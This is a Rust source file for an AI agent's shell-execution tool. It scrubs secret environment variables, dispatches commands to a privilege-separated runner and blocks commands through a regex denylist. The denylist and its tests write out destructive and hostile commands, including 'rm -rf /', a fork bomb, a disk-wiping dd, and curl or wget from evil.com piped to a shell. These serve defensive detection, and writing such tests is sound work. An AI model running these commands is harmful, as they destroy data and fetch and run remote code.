use std::path::PathBuf;
use std::time::Instant;

use async_trait::async_trait;
use eyre::Result;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::Deserialize;
use tracing::warn;

use super::exec_runner::{
    run_or_dispatch, EnvMode, ExecOutcome, ExecRequest, RunnerEndpoint, MAX_OUTPUT_SIZE,
};
use super::{Tool, ToolResult};

/// Secret env vars stripped from an in-process `exec.run` child. These grant full
/// vault decryption and admin-JWT forging and no legitimate command needs them;
/// removing them is the F7-partial containment shipped today, preserved exactly
/// for the in-process (dev/local) path. The privilege-separated runner closes the
/// vector fully by running as a separate user with a scrubbed env.
pub const EXEC_SECRET_VARS: &[&str] = &[
    "WORKFORCE_VAULT_KEY",
    "WORKFORCE_GATEWAY_TOKEN",
    "WORKFORCE_JWT_SECRET",
];

/// How an in-process `exec.run` child's environment is built. A configured
/// runner ignores it: the daemon always applies its own scrubbed allowlist.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum LocalEnv {
    /// The hub's environment minus [`EXEC_SECRET_VARS`]: servers and
    /// development, unchanged.
    #[default]
    Inherit,
    /// A clean, allowlisted environment, never the hub's, with the command
    /// run through the person's login shell so their dotfiles set up `PATH`
    /// and toolchains as in a terminal. For a hub on someone's own computer
    /// (`[desk]`), where commands run as the hub's own user.
    Allowlisted,
}

/// Login shells that take `-l -c <script> <arg0> <arg1>` the POSIX way, so
/// the command reaches `/bin/sh` as `$1`, unquoted and unchanged.
const LOGIN_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh"];

/// The program and arguments that run `command`: `sh -c <command>`, or, for
/// [`LocalEnv::Allowlisted`] with a known login shell in `shell`, that shell
/// as a login shell which then `exec`s `/bin/sh -c <command>`. The login
/// shell only sets up the environment from the person's dotfiles; the
/// command itself still runs under `sh`, as it does everywhere else.
fn shell_invocation(
    command: String,
    local_env: LocalEnv,
    shell: Option<&str>,
) -> (String, Vec<String>) {
    let login = shell
        .filter(|_| local_env == LocalEnv::Allowlisted)
        .map(std::path::Path::new)
        .filter(|p| p.is_absolute())
        .filter(|p| {
            p.file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| LOGIN_SHELLS.contains(&n))
        })
        .filter(|p| p.is_file());
    match login {
        Some(shell) => (
            shell.display().to_string(),
            vec![
                "-l".to_string(),
                "-c".to_string(),
                r#"exec /bin/sh -c "$1""#.to_string(),
                "sh".to_string(),
                command,
            ],
        ),
        None => ("sh".to_string(), vec!["-c".to_string(), command]),
    }
}

// Re-exported so existing callers (`code.*` tools) keep importing the workdir
// validator from `tools::exec`; the implementation now lives in `exec_runner`.
pub use super::exec_runner::validate_workdir;

/// Patterns for commands that should be blocked by default.
/// Best-effort command denylist. This is a defense-in-depth measure and NOT a
/// sandbox — determined attackers can bypass pattern matching. The policy engine
/// is the primary access control; this catches obvious dangerous commands.
static DENIED_COMMANDS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        // Destructive filesystem operations (no $ anchor to catch chained commands)
        r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+/\s",
        r"rm\s+-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*\s+/\s",
        r"rm\s+-rf\s+/\s*$",
        r"rm\s+-fr\s+/\s*$",
        r"rm\s+-rf\s+/(?:etc|usr|var|boot|sys|proc|dev|home)\b",
        r"sudo\s+rm\s+-[a-zA-Z]*r[a-zA-Z]*f",
        // Disk destruction
        r"dd\s+if=.*of=/dev/[sh]d",
        r"mkfs\b",
        // Fork bomb
        r":\(\)\{\s*:\|:&\s*\};:",
        // chmod world-writable on root
        r"chmod\s+(-R\s+)?777\s+/\s*$",
        // Pipe to shell (common exploitation pattern)
        r"curl\s+.*\|\s*(ba)?sh",
        r"wget\s+.*\|\s*(ba)?sh",
        r"curl\s+.*\|\s*sudo",
        r"wget\s+.*\|\s*sudo",
        // Base64 decode piped to shell
        r"base64\s+.*\|\s*(ba)?sh",
        // bash/sh -c with suspicious content
        r"(?:bash|sh)\s+-c\s+.*(?:rm\s+-rf|curl.*\|)",
        // Reverse shells
        r"(?:bash|sh|nc|ncat)\s+.*(?:/dev/tcp|/dev/udp)/",
        r"python[23]?\s+-c\s+.*socket\.connect",
        // Crypto mining
        r"(?:xmrig|minerd|cpuminer|stratum)",
        // Privilege escalation
        r"sudo\s+(?:su|bash|sh)\b",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("invalid security regex"))
    .collect()
});

/// Tool for executing shell commands.
pub struct ExecCommand {
    /// Maximum execution time in seconds.
    timeout_secs: u64,
    /// Default working directory for commands (agent workspace).
    workspace: Option<PathBuf>,
    /// Allowed base directories for workdir parameter.
    allowed_workdirs: Vec<PathBuf>,
    /// When set, commands are dispatched to the privilege-separated runner
    /// daemon at this unix socket instead of executing in-process. A configured
    /// socket is fail-closed: an unreachable daemon errors, never falling back
    /// to in-process execution (that would re-expose the vault — audit F7).
    runner: Option<RunnerEndpoint>,
    /// The child's environment when running in-process.
    local_env: LocalEnv,
}

impl ExecCommand {
    pub fn new(timeout_secs: u64) -> Self {
        Self {
            timeout_secs,
            workspace: None,
            allowed_workdirs: Vec::new(),
            runner: None,
            local_env: LocalEnv::Inherit,
        }
    }

    pub fn with_workspace(mut self, workspace: PathBuf) -> Self {
        self.allowed_workdirs.push(workspace.clone());
        self.workspace = Some(workspace);
        self
    }

    pub fn with_allowed_workdir(mut self, dir: PathBuf) -> Self {
        self.allowed_workdirs.push(dir);
        self
    }

    pub fn with_runner(mut self, runner: Option<RunnerEndpoint>) -> Self {
        self.runner = runner;
        self
    }

    pub fn with_local_env(mut self, local_env: LocalEnv) -> Self {
        self.local_env = local_env;
        self
    }
}

impl Default for ExecCommand {
    fn default() -> Self {
        Self::new(300)
    }
}

#[derive(Deserialize)]
struct ExecInput {
    command: String,
    #[serde(default)]
    workdir: Option<String>,
    #[serde(default)]
    timeout_secs: Option<u64>,
    #[serde(default)]
    retry: Option<u32>,
}

/// Check if a command matches any denied patterns.
pub fn is_command_denied(command: &str) -> Option<&'static str> {
    let trimmed = command.trim();

    for pattern in DENIED_COMMANDS.iter() {
        if pattern.is_match(trimmed) {
            return Some("Command blocked by security policy: matches a denied pattern.");
        }
    }

    None
}

/// Find the largest byte index <= max that is a valid UTF-8 char boundary.
fn floor_char_boundary(s: &str, max: usize) -> usize {
    if max >= s.len() {
        return s.len();
    }
    let mut end = max;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    end
}

/// Truncate output if it exceeds the maximum size.
fn truncate_output(output: &str) -> String {
    if output.len() > MAX_OUTPUT_SIZE {
        let end = floor_char_boundary(output, MAX_OUTPUT_SIZE);
        let truncated = &output[..end];
        format!("{truncated}\n\n[Output truncated at {MAX_OUTPUT_SIZE} bytes]")
    } else {
        output.to_string()
    }
}

/// Assemble the agent-facing `ToolResult` from the drained outcome. The shared
/// `run_or_dispatch` entry produces an identical `ExecOutcome` from the local or
/// remote path, so this assembly is the only `exec.run`-specific step.
fn assemble_result(outcome: ExecOutcome, requested_timeout: u64, start: Instant) -> ToolResult {
    let duration_ms = start.elapsed().as_millis() as u64;

    if outcome.summary.timed_out {
        return ToolResult::failure(
            format!("Command timed out after {requested_timeout}s"),
            duration_ms,
        );
    }

    let stdout = truncate_output(&outcome.stdout);
    let stderr = truncate_output(&outcome.stderr);
    let exit_code = outcome.exit_code();
    let success = outcome.success();

    ToolResult {
        success,
        output: serde_json::json!({
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": exit_code,
            "attempts": outcome.summary.attempts,
        }),
        error: if success {
            None
        } else {
            Some(format!("Command exited with code {exit_code}"))
        },
        rate_limited: None,
        duration_ms,
        loads: Vec::new(),
    }
}

#[async_trait]
impl Tool for ExecCommand {
    fn name(&self) -> &str {
        "exec.run"
    }

    fn description(&self) -> &str {
        "Execute a shell command and return stdout, stderr, and exit code."
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute" },
                "workdir": { "type": "string", "description": "Working directory (optional)" },
                "timeout_secs": { "type": "integer", "description": "Timeout in seconds (optional)" },
                "retry": { "type": "integer", "description": "Number of times to retry on transient failures (max 5)" }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, input: serde_json::Value) -> Result<ToolResult> {
        let start = Instant::now();
        let input: ExecInput =
            serde_json::from_value(input).map_err(|e| eyre::eyre!("Invalid input: {}", e))?;

        if let Some(reason) = is_command_denied(&input.command) {
            warn!(command = %input.command, "Blocked denied command");
            return Ok(ToolResult::failure(
                reason.to_string(),
                start.elapsed().as_millis() as u64,
            ));
        }

        // Tool-layer workdir validation (fast local reject / defence in depth);
        // the daemon is the authoritative enforcer when dispatching.
        if let Some(ref workdir) = input.workdir {
            if let Err(reason) = validate_workdir(workdir, &self.allowed_workdirs) {
                warn!(workdir = %workdir, "Blocked workdir outside allowed paths");
                return Ok(ToolResult::failure(
                    reason,
                    start.elapsed().as_millis() as u64,
                ));
            }
        }

        let requested_timeout = input.timeout_secs.unwrap_or(self.timeout_secs);
        let effective_workdir = input
            .workdir
            .clone()
            .or_else(|| self.workspace.as_ref().map(|p| p.display().to_string()));

        // The login shell is the hub's, and only matters in-process: the
        // daemon runs `sh` under its own user.
        let local_env = if self.runner.is_some() {
            LocalEnv::Inherit
        } else {
            self.local_env
        };
        let shell = std::env::var("SHELL").ok();
        let (program, args) = shell_invocation(input.command, local_env, shell.as_deref());
        let req = ExecRequest {
            program,
            args,
            workdir: effective_workdir,
            timeout_secs: requested_timeout,
            // The wire protocol carries a bool, not a count; any positive retry
            // enables the daemon's capped transient-retry loop.
            allow_retry: input.retry.unwrap_or(0) > 0,
            env: Vec::new(),
            stdin: None,
            scope: None,
            mcp: None,
        };

        // In-process: the parent env minus the three secret vars (servers and
        // development, unchanged), or the allowlist alone on a hub on
        // someone's own computer. When dispatching, the daemon scrubs to its
        // allowlist instead and this mode is ignored.
        let local_env = match local_env {
            LocalEnv::Inherit => EnvMode::Inherit {
                remove: EXEC_SECRET_VARS,
            },
            LocalEnv::Allowlisted => EnvMode::Allowlisted,
        };
        match run_or_dispatch(self.runner.as_ref(), req, &self.allowed_workdirs, local_env).await {
            Ok(outcome) => Ok(assemble_result(outcome, requested_timeout, start)),
            Err(e) => Ok(ToolResult::failure(
                e.to_string(),
                start.elapsed().as_millis() as u64,
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn exec_simple_command() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({"command": "echo hello"}))
            .await
            .unwrap();

        assert!(result.success);
        assert_eq!(result.output["stdout"].as_str().unwrap().trim(), "hello");
        assert_eq!(result.output["exit_code"], 0);
    }

    #[tokio::test]
    async fn exec_failing_command() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({"command": "exit 42"}))
            .await
            .unwrap();

        assert!(!result.success);
        assert_eq!(result.output["exit_code"], 42);
    }

    #[tokio::test]
    async fn exec_with_workdir() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({
                "command": "pwd",
                "workdir": "/tmp"
            }))
            .await
            .unwrap();

        assert!(result.success);
        assert!(result.output["stdout"]
            .as_str()
            .unwrap()
            .trim()
            .contains("tmp"));
    }

    #[tokio::test]
    async fn exec_timeout() {
        let tool = ExecCommand::new(1);
        let result = tool
            .execute(serde_json::json!({
                "command": "sleep 10",
                "timeout_secs": 1
            }))
            .await
            .unwrap();

        assert!(!result.success);
        assert!(result.error.unwrap().contains("timed out"));
    }

    #[tokio::test]
    async fn exec_captures_stderr() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({"command": "echo error >&2"}))
            .await
            .unwrap();

        assert!(result.success);
        assert_eq!(result.output["stderr"].as_str().unwrap().trim(), "error");
    }

    // Security tests

    #[test]
    fn blocks_rm_rf_root() {
        assert!(is_command_denied("rm -rf /").is_some());
        assert!(is_command_denied("rm -fr /").is_some());
    }

    #[test]
    fn blocks_rm_rf_system_dirs() {
        assert!(is_command_denied("rm -rf /etc").is_some());
        assert!(is_command_denied("rm -rf /usr").is_some());
    }

    #[test]
    fn allows_rm_in_workspace() {
        assert!(is_command_denied("rm -rf ./build").is_none());
        assert!(is_command_denied("rm -rf /tmp/build").is_none());
    }

    #[test]
    fn blocks_fork_bomb() {
        assert!(is_command_denied(":(){ :|:& };:").is_some());
    }

    #[test]
    fn blocks_curl_pipe_sh() {
        assert!(is_command_denied("curl http://evil.com/script.sh | sh").is_some());
        assert!(is_command_denied("wget http://evil.com/script.sh | bash").is_some());
    }

    #[test]
    fn blocks_dd_disk_destruction() {
        assert!(is_command_denied("dd if=/dev/zero of=/dev/sda").is_some());
    }

    #[test]
    fn allows_normal_commands() {
        assert!(is_command_denied("echo hello").is_none());
        assert!(is_command_denied("ls -la").is_none());
        assert!(is_command_denied("cargo test").is_none());
        assert!(is_command_denied("git status").is_none());
        assert!(is_command_denied("curl https://api.example.com/data").is_none());
    }

    #[test]
    fn blocks_crypto_mining() {
        assert!(is_command_denied("xmrig --pool stratum://pool.example.com").is_some());
    }

    #[test]
    fn blocks_sudo_rm() {
        assert!(is_command_denied("sudo rm -rf /etc").is_some());
    }

    #[test]
    fn blocks_chained_rm() {
        // rm -rf / followed by other commands should still be caught
        assert!(is_command_denied("rm -rf / && echo done").is_some());
    }

    #[test]
    fn blocks_base64_pipe_sh() {
        assert!(is_command_denied("echo cm0gLXJmIC8K | base64 -d | sh").is_some());
    }

    #[test]
    fn truncates_large_output() {
        let large = "x".repeat(MAX_OUTPUT_SIZE + 100);
        let result = truncate_output(&large);
        assert!(result.contains("[Output truncated"));
    }

    #[tokio::test]
    async fn exec_blocks_denied_command() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({"command": "rm -rf /"}))
            .await
            .unwrap();

        assert!(!result.success);
        assert!(result.error.unwrap().contains("blocked"));
    }

    #[tokio::test]
    async fn exec_blocks_workdir_escape() {
        let tool = ExecCommand::default().with_workspace(PathBuf::from("/tmp/agent-workspace"));
        let result = tool
            .execute(serde_json::json!({
                "command": "ls",
                "workdir": "/etc"
            }))
            .await
            .unwrap();

        assert!(!result.success);
        assert!(result.error.unwrap().contains("outside allowed"));
    }

    #[tokio::test]
    async fn exec_default_attempts_is_one() {
        let tool = ExecCommand::default();
        let result = tool
            .execute(serde_json::json!({"command": "echo hello"}))
            .await
            .unwrap();

        assert!(result.success);
        assert_eq!(result.output["attempts"], 1);
    }

    #[tokio::test]
    async fn exec_no_retry_on_permanent_failure() {
        let tool = ExecCommand::default();
        // `false` produces no stderr, so no transient pattern matches → 1 attempt.
        let result = tool
            .execute(serde_json::json!({
                "command": "false",
                "retry": 3
            }))
            .await
            .unwrap();

        assert!(!result.success);
        assert_eq!(result.output["attempts"], 1);
    }

    #[tokio::test]
    async fn exec_retry_on_transient_failure_caps_attempts() {
        let tool = ExecCommand::default();
        // The protocol carries a bool, so any positive retry enables the
        // daemon's capped loop: 1 initial + MAX_RETRIES retries.
        let result = tool
            .execute(serde_json::json!({
                "command": "echo 'Connection refused' >&2 && exit 1",
                "retry": 2
            }))
            .await
            .unwrap();

        assert!(!result.success);
        assert_eq!(
            result.output["attempts"],
            1 + super::super::exec_runner::MAX_RETRIES
        );
    }

    /// A configured-but-unreachable runner socket must fail closed: the tool
    /// errors and the command does NOT run in-process.
    #[tokio::test]
    async fn unreachable_runner_socket_fails_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let socket = tmp.path().join("absent.sock");
        let sentinel = tmp.path().join("sentinel.txt");

        let tool = ExecCommand::default().with_runner(Some(RunnerEndpoint::Unix(socket)));
        let result = tool
            .execute(serde_json::json!({
                "command": format!("touch {}", sentinel.display()),
            }))
            .await
            .unwrap();

        assert!(!result.success);
        assert!(result
            .error
            .unwrap()
            .contains("secure command runner unavailable"));
        assert!(!sentinel.exists(), "fail-closed violated: command executed");
    }

    #[test]
    fn commands_run_under_sh_unless_allowlisted_with_a_login_shell() {
        let cmd = || "echo hi".to_string();
        assert_eq!(
            shell_invocation(cmd(), LocalEnv::Inherit, Some("/bin/sh")),
            (
                "sh".to_string(),
                vec!["-c".to_string(), "echo hi".to_string()]
            )
        );
        let (program, args) = shell_invocation(cmd(), LocalEnv::Allowlisted, Some("/bin/sh"));
        assert_eq!(program, "/bin/sh");
        assert_eq!(
            args,
            ["-l", "-c", r#"exec /bin/sh -c "$1""#, "sh", "echo hi"]
        );
        // A shell that doesn't take positional arguments the POSIX way, a
        // relative path or a missing file falls back to plain `sh`.
        for shell in [
            Some("/usr/local/bin/fish"),
            Some("zsh"),
            Some("/nope/zsh"),
            None,
        ] {
            assert_eq!(
                shell_invocation(cmd(), LocalEnv::Allowlisted, shell).0,
                "sh",
                "{shell:?}"
            );
        }
    }

    /// On a hub on someone's own computer, a command `exec.run` starts sees
    /// neither of the hub's database secrets, nor any other variable off the
    /// allowlist, and still runs exactly as written.
    #[tokio::test]
    async fn allowlisted_exec_run_cannot_see_the_hubs_secrets() {
        // Names no other test in this binary touches.
        unsafe {
            std::env::set_var("DESK_POSTGRES_PASSWORD", "pw-fixture");
            std::env::set_var("DESK_MEMORY_KEY", "mk-fixture");
            std::env::set_var("EXEC_T_OFF_THE_ALLOWLIST", "other-fixture");
        }
        let tool = ExecCommand::default().with_local_env(LocalEnv::Allowlisted);
        // Names only, and probes for the two values: the person's dotfiles
        // run in the login shell, and what they export never reaches a test
        // log.
        let result = tool
            .execute(serde_json::json!({
                "command": "env | cut -d= -f1; \
                    echo \"pw=[${DESK_POSTGRES_PASSWORD:-absent}] mk=[${DESK_MEMORY_KEY:-absent}]\"; \
                    echo \"quoted 'arg' $((1 + 1))\"",
            }))
            .await
            .unwrap();
        unsafe {
            std::env::remove_var("DESK_POSTGRES_PASSWORD");
            std::env::remove_var("DESK_MEMORY_KEY");
            std::env::remove_var("EXEC_T_OFF_THE_ALLOWLIST");
        }
        assert!(result.success, "exit code {}", result.output["exit_code"]);
        let stdout = result.output["stdout"].as_str().unwrap();
        let names: Vec<&str> = stdout.lines().collect();
        for leaked in [
            "DESK_POSTGRES_PASSWORD",
            "DESK_MEMORY_KEY",
            "EXEC_T_OFF_THE_ALLOWLIST",
        ] {
            assert!(!names.contains(&leaked), "{leaked} reached the command");
        }
        assert!(
            names.contains(&"pw=[absent] mk=[absent]"),
            "a secret's value reached the command"
        );
        assert_eq!(
            names.last(),
            Some(&"quoted 'arg' 2"),
            "the command was changed on its way through the login shell"
        );
    }

    /// Elsewhere (no `[desk]`), the in-process path is unchanged: ordinary
    /// variables pass through, the three secrets don't.
    #[tokio::test]
    async fn inherited_exec_run_is_unchanged() {
        unsafe {
            std::env::set_var("EXEC_T_INHERITED", "passes");
        }
        let result = ExecCommand::default()
            .execute(serde_json::json!({"command": "echo [${EXEC_T_INHERITED:-absent}]"}))
            .await
            .unwrap();
        unsafe {
            std::env::remove_var("EXEC_T_INHERITED");
        }
        assert_eq!(result.output["stdout"].as_str().unwrap().trim(), "[passes]");
    }

    /// End-to-end through the tool's dispatch arm against a live daemon: the
    /// assembled `ToolResult` is identical in shape to the in-process path.
    #[tokio::test]
    async fn exec_dispatches_through_live_runner() {
        use super::super::exec_runner::{serve, Listener, LocalJobHandler};

        let tmp = tempfile::tempdir().unwrap();
        let socket = tmp.path().join("exec.sock");

        // The daemon accepts this process's own uid (read via a self-pair).
        let accept_uid = {
            let (a, _b) = tokio::net::UnixStream::pair().unwrap();
            a.peer_cred().unwrap().uid()
        };
        let serve_socket = socket.clone();
        tokio::spawn(async move {
            let listener = Listener::Unix {
                path: serve_socket,
                accept_uid,
            };
            let _ = serve(listener, std::sync::Arc::new(LocalJobHandler)).await;
        });
        for _ in 0..200 {
            if socket.exists() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }

        let tool = ExecCommand::default().with_runner(Some(RunnerEndpoint::Unix(socket)));
        let result = tool
            .execute(serde_json::json!({"command": "echo via-daemon"}))
            .await
            .unwrap();

        assert!(result.success);
        assert_eq!(
            result.output["stdout"].as_str().unwrap().trim(),
            "via-daemon"
        );
        assert_eq!(result.output["exit_code"], 0);
        assert_eq!(result.output["attempts"], 1);
    }
}
